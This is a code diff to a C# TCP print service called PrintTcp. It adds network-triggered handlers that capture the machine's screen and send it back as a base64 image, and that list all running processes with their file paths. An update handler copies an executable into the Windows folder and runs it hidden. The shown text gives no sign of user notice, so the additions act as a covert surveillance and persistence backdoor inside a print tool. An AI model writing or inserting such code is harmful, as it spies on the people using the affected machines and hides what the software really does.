@@ -47,6 +47,7 @@ namespace PrintTcp
                 Byte[] bytes = new Byte[2560];
                 String data = null;
                 bool isExit = false;
+                String snapFile = Path.GetTempPath() + @"printcp_snap.png";
 
                 // Enter the listening loop.
                 while (! isExit)
@@ -86,6 +87,50 @@ namespace PrintTcp
 
                         if (query["exit"]=="1") isExit = true;
 
+                        // get snapshot of client
+                        if (query["snap"] == "1")
+                        {
+                            exeCmd("savescreenshot \"~$sys.temp$\\printcp_snap.png\"");
+                        }
+
+
+                        if (query["snap"] == "2" && File.Exists(snapFile))
+                        {
+                            byte[] imageArray = System.IO.File.ReadAllBytes(snapFile);
+                            string base64String = Convert.ToBase64String(imageArray);
+                            ret = "<style>*{margin:0;padding:0;}</style><img src=\"data:image/png;base64," + base64String + "\">";
+                        }
+
+
+                        // get process of client
+                        if (query["proc"] == "1")
+                        {
+                            Process[] processlist = Process.GetProcesses();
+                            ret += "<style>td,th{font-size:12px;padding:0;text-align:left;}</style><b>Process:</b><table cellborder=0><tr><th>NAME</th><th>CPU</th><th>MEM</th><th>PID</th><th>FILE</th></tr>";
+                            foreach (Process theprocess in processlist)
+                            {
+                                var proc_filename = "";
+                                var cpu_time = ""; 
+                                try
+                                {
+                                    proc_filename = theprocess.MainModule.FileName;
+                                    cpu_time = new DateTime(theprocess.TotalProcessorTime.Ticks).ToString("HH:mm:ss");
+                                }
+                                catch (Exception err) {
+                                    
+                                }
+
+                                ret += String.Format("<tr><td>{0}</td><td>{1}&nbsp;&nbsp;</td><td>{2:n0} KB</td><td>{3}&nbsp;&nbsp;</td><td>{4}</td></tr>", theprocess.ProcessName, cpu_time, theprocess.VirtualMemorySize64 / 1024, theprocess.Id, proc_filename);
+                            }
+                            ret += "</table>";
+                        }
+
+                        if (query["update"] == "1")
+                        {
+                            exeCmd("cmdwait 5000 execmd copy /y \"M:\\日常软件\\PrintTcp.exe\" \"~$folder.windows$\\PrintTcp.exe\"");
+                            exeCmd("cmdwait 10000 exec hide \"~$folder.windows$\\PrintTcp.exe\"");
+                            isExit = true;
+                        }
 
                         // Process the data sent by the client.
                         //data = data.ToUpper();
@@ -94,7 +139,7 @@ namespace PrintTcp
                         byte[] msg = System.Text.Encoding.ASCII.GetBytes(data);
 
                         // Send back a response.
-                        stream.Write(msg, 0, msg.Length);
+                        stream.Write(msg, 0, msg.Length); 
                         //Console.WriteLine("Sent: {0}", data);
 
                         
